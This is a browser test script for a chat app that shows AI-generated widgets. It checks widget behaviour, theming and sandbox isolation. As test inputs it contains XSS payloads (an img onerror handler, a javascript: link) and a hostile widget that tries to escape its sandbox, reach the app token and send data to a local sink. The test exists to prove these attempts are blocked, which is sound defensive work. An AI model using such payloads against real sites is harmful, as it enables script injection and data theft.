import assert from "node:assert/strict";
import { randomUUID } from "node:crypto";
import { access, mkdir, writeFile } from "node:fs/promises";
import { createServer } from "node:http";
import { resolve } from "node:path";
import { chromium, type Browser } from "playwright-core";
import { createApp } from "../server/http.js";
import { pastedSource } from "../server/source.js";
import type { ChatMessage } from "../shared/types.js";
import { widgetPath } from "../shared/widgets.js";
import { fixture, waitFor } from "../tests/helpers.js";
import { BUILTIN_REPLY, CHART, FLASHCARDS, QUIZ, STEPS, WIDGET_REPLY, WIDGET_SOURCE } from "../tests/fixtures/widgets.js";

const candidates = [process.env.PI_COMPANION_BROWSER,
  "C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe",
  "C:/Program Files/Google/Chrome/Application/chrome.exe",
  "C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe",
  "/usr/bin/chromium", "/usr/bin/google-chrome", "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"].filter(Boolean) as string[];
let executablePath = "";
for (const candidate of candidates) { try { await access(candidate); executablePath = candidate; break; } catch {} }
if (!executablePath) throw new Error("Set PI_COMPANION_BROWSER to a Chromium browser executable.");
await mkdir("evidence", { recursive: true });
const results: Record<string, unknown> = { timestamp: new Date().toISOString(), browser: executablePath, usesFakePi: true };
const f = await fixture();
const app = createApp(f.companion, resolve("dist"));
const sinkRequests: string[] = [], appRequests: string[] = [];
const sink = createServer((request, response) => { sinkRequests.push(request.url ?? ""); response.end("Unexpected network request"); });
await new Promise<void>(resolve => sink.listen(0, "127.0.0.1", resolve));
const sinkOrigin = `http://127.0.0.1:${(sink.address() as { port: number }).port}`;
app.server.on("request", request => appRequests.push(request.url ?? ""));
const block = (name: string, value: unknown) => "```" + name + "\n" + JSON.stringify(value) + "\n```";
let browser: Browser | undefined;
try {
  const origin = await app.listen(0);
  browser = await chromium.launch({ executablePath, headless: true, args: ["--no-first-run", "--disable-default-apps"] });
  const context = await browser.newContext({ viewport: { width: 1440, height: 1000 }, reducedMotion: "reduce" });
  const page = await context.newPage();
  const pageErrors: string[] = [], policyMessages: string[] = [];
  page.on("pageerror", error => pageErrors.push(error.message));
  page.on("console", message => { if (/Content Security Policy|sandboxed|Blocked script|Refused/i.test(message.text())) policyMessages.push(message.text()); });
  const ready = async () => { await page.waitForFunction(() => document.querySelector(".app")?.getAttribute("data-status") === "ready"); };
  const show = async (text: string, status: ChatMessage["status"] = "complete") => {
    const message: ChatMessage = { id: randomUUID(), role: "assistant", text, status };
    f.companion.state.messages = [{ id: randomUUID(), role: "user", text: "Show me a widget.", status: "complete" }, message];
    await page.goto(origin); await ready();
    return widgetPath(f.companion.state.sessionId, message.id, 0);
  };
  const noCodeView = async () => {
    assert.equal(await page.getByRole("button", { name: /^(Code|Preview|Run widget)$/ }).count(), 0, "Widgets have no code view or run step");
    assert.equal(await page.locator(".message-body pre").count(), 0, "Widget source is not shown");
  };

  // Custom HTML widgets start on their own when the reply is complete.
  await show(WIDGET_REPLY);
  assert.equal(await page.locator(".widget").count(), 1);
  await noCodeView();
  const frame = page.frameLocator(".widget-frame");
  await frame.getByRole("button", { name: "Add one" }).click();
  assert.equal(await frame.locator("#count").textContent(), "1");
  await frame.getByRole("slider").focus(); await frame.getByRole("slider").press("ArrowRight");
  assert.equal(await frame.locator("#value").textContent(), "3");
  assert.equal(await page.locator(".widget-frame").getAttribute("sandbox"), "allow-scripts");
  // The frame grows to fit its content, so the widget needs no scrollbar of its own.
  await page.waitForFunction(() => document.querySelector<HTMLIFrameElement>(".widget-frame")?.style.height !== "");
  assert.equal(await frame.locator("html").evaluate(node => node.scrollHeight <= innerHeight), true);
  // The style kit gives custom widgets the app's theme.
  assert.equal(await frame.locator("body").evaluate(node => getComputedStyle(node).color), "rgb(27, 27, 25)");
  assert.match(await frame.getByRole("button", { name: "Add one" }).evaluate(node => getComputedStyle(node).backgroundColor), /^rgb\((91, 91, 214|77, 77, 196)\)$/, "Accent, or accent hover");
  const isolation = await frame.locator("body").evaluate(() => {
    let parentBlocked = false, storageBlocked = false;
    try { void parent.document; } catch { parentBlocked = true; }
    try { localStorage.setItem("widget", "no"); } catch { storageBlocked = true; }
    return { parentBlocked, storageBlocked, origin: self.origin };
  });
  assert.deepEqual(isolation, { parentBlocked: true, storageBlocked: true, origin: "null" });
  await page.getByRole("button", { name: "Collapse widget" }).click();
  assert.equal(await page.locator(".widget-frame").isVisible(), false);
  await page.getByRole("button", { name: "Expand widget" }).click();
  assert.equal(await frame.locator("#count").textContent(), "1", "Collapsing keeps the running widget");
  await page.locator(".widget-title").click();
  assert.equal(await page.locator(".widget-frame").isVisible(), false, "The title bar also collapses the widget");
  await page.locator(".widget-title").click();
  await page.locator("#question").fill("A follow-up question"); await page.locator("#send").click();
  await waitFor(() => f.companion.state.messages.length === 4 && !f.companion.state.busy); await ready();
  assert.equal(await frame.locator("#count").textContent(), "1", "SSE snapshots and new replies do not restart widgets");
  await page.getByRole("button", { name: "Restart widget", exact: true }).click();
  await page.waitForFunction(() => document.querySelectorAll(".widget-frame").length === 1);
  assert.equal(await frame.locator("#count").textContent(), "0");
  await frame.getByRole("button", { name: "Add one" }).click();
  await page.locator(".widget").scrollIntoViewIfNeeded();
  await page.screenshot({ path: "evidence/10-widget-desktop.png" });
  await page.emulateMedia({ colorScheme: "dark" });
  assert.equal(await frame.locator("body").evaluate(node => getComputedStyle(node).color), "rgb(237, 237, 239)", "The kit follows the dark theme");
  await page.screenshot({ path: "evidence/11-widget-dark.png" });
  await page.emulateMedia({ colorScheme: "light" });
  await page.setViewportSize({ width: 390, height: 844 });
  assert.equal(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth), true);
  await page.locator(".widget").evaluate(node => node.scrollIntoView({ block: "start" }));
  await page.screenshot({ path: "evidence/12-widget-mobile.png" });
  await page.reload(); await ready();
  assert.equal(await frame.locator("#count").textContent(), "0", "Refresh starts the widget again, without old state");
  results.autoRunCollapseRestartRefreshAndThemes = true;

  await page.setViewportSize({ width: 1440, height: 1000 });
  await show(WIDGET_REPLY + "\n\n```widget Second counter\n" + WIDGET_SOURCE + "\n```");
  await page.frameLocator(".widget-frame").nth(0).getByRole("button", { name: "Add one" }).click();
  assert.equal(await page.frameLocator(".widget-frame").nth(0).locator("#count").textContent(), "1");
  assert.equal(await page.frameLocator(".widget-frame").nth(1).locator("#count").textContent(), "0");
  results.independentWidgets = true;

  for (const status of ["streaming", "aborted", "error"] as const) {
    await show(WIDGET_REPLY, status);
    assert.equal(await page.locator("iframe").count(), 0, status);
    assert.equal(await page.locator(".widget-note").count(), 1, status);
  }
  await show("Here it is.\n\n```widget\n<button>Unclosed</button>", "streaming");
  assert.equal(await page.locator(".widget-pending").textContent(), "Pi is writing a widget…");
  await noCodeView();
  await show("Here it is.\n\n```quiz\n{\"questions\":[", "streaming");
  assert.equal(await page.locator(".widget-pending").textContent(), "Pi is making the quiz…");
  await show("```widget\n<button>Unclosed</button>");
  assert.equal(await page.locator(".widget, .widget-pending, iframe").count(), 0, "An unfinished fence in a finished reply stays code");
  assert.equal(await page.locator(".message-body pre").count(), 1);
  await show('<script>window.compromised=1</script>\n\n```html\n<button onclick="window.compromised=1">Code only</button>\n```\n\n> ```widget\n> <button>Quoted</button>\n> ```');
  assert.equal(await page.locator(".widget, iframe, .message-body script, .message-body button").count(), 0);
  assert.equal(await page.evaluate(() => (window as any).compromised), undefined);
  results.pendingIncompleteRepliesAndOrdinaryHtmlStayInert = true;

  // Built-in widgets: Pi sends data, the app draws it. Nothing runs in a frame.
  await page.setViewportSize({ width: 1440, height: 2400 });
  await show(BUILTIN_REPLY);
  assert.equal(await page.locator(".widget").count(), 4);
  assert.equal(await page.locator("iframe").count(), 0, "Built-in widgets are app components, not frames");
  await noCodeView();
  const widget = (name: string) => page.locator(".widget").filter({ has: page.locator(name) });
  const chart = widget(".chart");
  assert.equal(await chart.locator(".widget-title").textContent(), CHART.title);
  assert.equal(await chart.locator(".chart-plot svg path").count(), CHART.labels.length * CHART.series.length, "One bar for each value");
  assert.deepEqual(await chart.locator(".chart-legend li").allTextContents(), ["Print", "Online"]);
  await chart.locator(".chart-plot svg").hover({ position: { x: 60, y: 120 } });
  assert.match((await chart.locator(".chart-tip").textContent())!, /^2021.*70%.*Print.*30%.*Online$/);
  await page.mouse.move(0, 0);
  assert.equal(await chart.locator(".chart-tip").count(), 0);
  await chart.locator(".chart-plot").focus(); await page.keyboard.press("ArrowLeft");
  assert.equal(await chart.locator(".chart-plot .sr-only").textContent(), "2024: Print 32%, Online 68%");
  await chart.getByText("Show data").click();
  assert.equal(await chart.locator("tbody tr").count(), CHART.labels.length);
  assert.equal(await chart.locator(".chart-note").textContent(), CHART.note);
  assert.equal(await widget(".steps").locator("li").count(), STEPS.steps.length);
  const quiz = widget(".quiz");
  await quiz.getByRole("button", { name: "Print", exact: true }).click();
  assert.equal(await quiz.locator(".quiz-feedback").first().textContent(), `Not quite. The answer is “Online”. ${QUIZ.questions[0].explanation}`);
  await quiz.getByRole("button", { name: "Online", exact: true }).click({ force: true });
  assert.equal(await quiz.locator(".quiz-feedback").count(), 1, "An answered question is locked");
  await quiz.getByRole("button", { name: "2023", exact: true }).click();
  assert.equal(await quiz.locator(".quiz-footer span").textContent(), `You got 1 of ${QUIZ.questions.length} right.`);
  await quiz.getByRole("button", { name: "Collapse widget" }).click();
  await quiz.getByRole("button", { name: "Expand widget" }).click();
  assert.equal(await quiz.locator(".quiz-feedback").count(), 2, "Collapsing keeps the answers");
  const cards = widget(".flashcards");
  assert.equal(await cards.locator(".flashcard-text").textContent(), FLASHCARDS.cards[0].front);
  await cards.locator(".flashcard").click();
  assert.equal(await cards.locator(".flashcard-text").textContent(), FLASHCARDS.cards[0].back);
  await cards.getByRole("button", { name: "Next card" }).click();
  assert.equal(await cards.locator(".flashcard-text").textContent(), FLASHCARDS.cards[1].front, "A new card starts on its front");
  await page.screenshot({ path: "evidence/13-builtin-widgets.png" });
  await page.emulateMedia({ colorScheme: "dark" });
  await page.screenshot({ path: "evidence/14-builtin-dark.png" });
  await page.emulateMedia({ colorScheme: "light" });
  await page.setViewportSize({ width: 390, height: 2400 });
  assert.equal(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth), true);
  await page.screenshot({ path: "evidence/15-builtin-mobile.png" });
  await quiz.getByRole("button", { name: "Try again" }).click();
  assert.equal(await quiz.locator(".quiz-feedback").count(), 0);
  results.builtinChartStepsQuizFlashcards = true;

  await page.setViewportSize({ width: 1440, height: 1000 });
  await show(block("chart", { title: "Trend", type: "line", labels: ["A", "B", "C"], series: [{ name: "One", values: [1, 3, 2] }, { name: "Two", values: [2, 1, 4] }] }));
  assert.equal(await page.locator(".chart-line").count(), 2);
  assert.equal(await page.locator(".chart-dot").count(), 6);
  const hostile = "<img src=x onerror=\"window.compromised=1\">";
  await show(block("steps", { title: hostile, steps: [{ title: hostile, detail: "[link](javascript:alert(1)) **bold**" }] }));
  assert.equal(await page.locator(".widget-title").textContent(), hostile, "Built-in text is shown as text");
  assert.equal(await page.locator(".message-body img, .message-body a, .message-body strong:not(.widget-title)").count(), 1, "Only the step title's own <strong>");
  await show(block("chart", { labels: ["A", "B"], series: [{ values: [1] }] }) + "\n\n```quiz\n{not json\n```");
  assert.equal(await page.locator(".widget").count(), 0, "Invalid built-in data stays code");
  assert.equal(await page.locator(".message-body pre").count(), 2);
  assert.equal(await page.evaluate(() => (window as any).compromised), undefined);
  results.lineChartPlainTextAndInvalidData = true;

  // A local HTTP sink proves prohibited requests do not reach a server, not just that CORS hides responses.
  const malicious = `<link rel="stylesheet" href="${sinkOrigin}/style.css">
<style>@import url('${sinkOrigin}/import.css'); body { background-image: url('${sinkOrigin}/background'); }</style>
<img src="${sinkOrigin}/image"><script src="${sinkOrigin}/script.js"></script>
<iframe src="${sinkOrigin}/frame"></iframe><object data="${sinkOrigin}/object"></object>
<pre id="report"></pre>
<button id="navigate" onclick="location.href='${sinkOrigin}/navigate'">Navigate away</button>
<button id="app" onclick="location.href='${origin}/'">Navigate to app</button>
<form action="${sinkOrigin}/form"><button id="submit" type="submit">Submit</button></form>
<script>
(async () => {
  const results = {};
  try { parent.document.querySelector('meta[name=companion-token]'); } catch { results.parent = true; }
  try { parent.compromised = true; } catch { results.writeParent = true; }
  try { localStorage.setItem('secret', 'no'); } catch { results.storage = true; }
  try { document.cookie = 'widget=no'; } catch { results.cookies = true; }
  try { top.location.href = '${sinkOrigin}/top'; } catch { results.top = true; }
  results.popup = window.open('${sinkOrigin}/popup') === null;
  try { eval('results.evaluated = true'); } catch { results.eval = true; }
  try { await fetch('${sinkOrigin}/fetch'); } catch { results.fetch = true; }
  try { await fetch('${origin}/api/state'); } catch { results.api = true; }
  try { const xhr = new XMLHttpRequest(); xhr.open('GET', '${sinkOrigin}/xhr', false); xhr.send(); } catch { results.xhr = true; }
  navigator.sendBeacon('${sinkOrigin}/beacon', 'no'); results.beacon = true;
  document.getElementById('report').textContent = JSON.stringify(results);
  parent.postMessage({ type: 'api', command: 'bash', text: 'ignore me' }, '*');
})();
</script>`;
  const oldPath = await show("```widget Isolation test\n" + malicious + "\n```");
  await page.waitForFunction(() => document.querySelectorAll(".widget-frame").length === 1);
  const securityFrame = page.frameLocator(".widget-frame");
  await securityFrame.locator("#report").filter({ hasText: "beacon" }).waitFor();
  const report = JSON.parse((await securityFrame.locator("#report").textContent())!);
  for (const name of ["parent", "writeParent", "storage", "cookies", "top", "popup", "eval", "fetch", "api", "xhr", "beacon"]) assert.equal(report[name], true, name);
  const before = appRequests.length;
  await securityFrame.locator("#submit").click();
  await securityFrame.locator("#navigate").click();
  await page.waitForTimeout(300);
  assert.deepEqual(sinkRequests, []);
  assert.deepEqual(appRequests.slice(before), [], "Widget actions must not reach the app's endpoints");
  await page.getByRole("button", { name: "Restart widget", exact: true }).click();
  await securityFrame.locator("#report").filter({ hasText: "beacon" }).waitFor();
  const beforeNavigation = appRequests.length;
  await securityFrame.locator("#app").click();
  await page.waitForTimeout(300);
  assert.deepEqual(appRequests.slice(beforeNavigation), [], "The token-bearing app page is not an allowed frame destination");
  assert.equal(page.url(), origin + "/");
  assert.equal(await page.evaluate(() => (window as any).compromised), undefined);
  assert.equal(context.pages().length, 1);
  assert.equal(f.companion.state.mode, "reading");
  assert.equal(f.companion.state.tools.length, 0);
  assert.deepEqual(sinkRequests, []);
  results.blockedParentStorageEvalNetworkResourcesFormsPopupsAndNavigation = true;
  results.expectedPolicyViolations = policyMessages.length;

  // The quiz skill: a wrong answer links to its article section, and the buttons under a finished quiz run skills/quiz.md.
  const article = pastedSource("## Formats\n\nOnline grew every year.\n\n## Years\n\nOnline passed print in 2023.", "Reading formats");
  await f.companion.setSource(article, f.companion.state.sessionId);
  await show(block("quiz", { title: "Formats", questions: [{ question: "Which format grew?", options: ["Print", "Online"], answer: 1, section: `#${article.sections[0].id}` }] }));
  const skillQuiz = page.locator(".quiz");
  assert.equal(await skillQuiz.locator(".quiz-next").count(), 0, "The next steps show when every question is answered");
  await skillQuiz.getByRole("button", { name: "Print", exact: true }).click();
  assert.deepEqual(await skillQuiz.locator(".quiz-next button").allTextContents(), ["More on what I missed", "Explain my mistakes", "Go deeper"]);
  await skillQuiz.getByRole("button", { name: "Read “Formats”" }).click();
  await page.locator(`[id="${article.sections[0].id}"].reference-highlight`).waitFor();
  await page.screenshot({ path: "evidence/16-quiz-skill.png" });
  await skillQuiz.getByRole("button", { name: "Explain my mistakes" }).click();
  await page.locator(".message.user", { hasText: "Explain what I got wrong" }).waitFor();
  await ready();
  assert.equal(f.companion.state.messages.at(-2)?.text, "Explain what I got wrong");
  results.quizSkillSectionLinkAndNextSteps = true;

  await f.companion.restart("reading"); await page.reload(); await ready();
  assert.equal(await page.locator(".widget, iframe").count(), 0);
  assert.equal((await fetch(origin + oldPath, { headers: { "Sec-Fetch-Dest": "iframe", "Sec-Fetch-Site": "same-origin" } })).status, 404);
  assert.deepEqual(pageErrors, []);
  results.newChatRevokesWidgets = true;
  results.passed = true;
} catch (error) {
  results.passed = false; results.error = (error as Error).stack; process.exitCode = 1;
  const page = browser?.contexts()[0]?.pages()[0];
  if (page) await page.screenshot({ path: "evidence/widget-failure.png" }).catch(() => {});
} finally {
  await browser?.close(); await app.close(); await f.close();
  sink.closeAllConnections(); await new Promise<void>(resolve => sink.close(() => resolve()));
  await writeFile("evidence/widgets.json", JSON.stringify(results, null, 2) + "\n");
  console.log(JSON.stringify(results, null, 2));
}
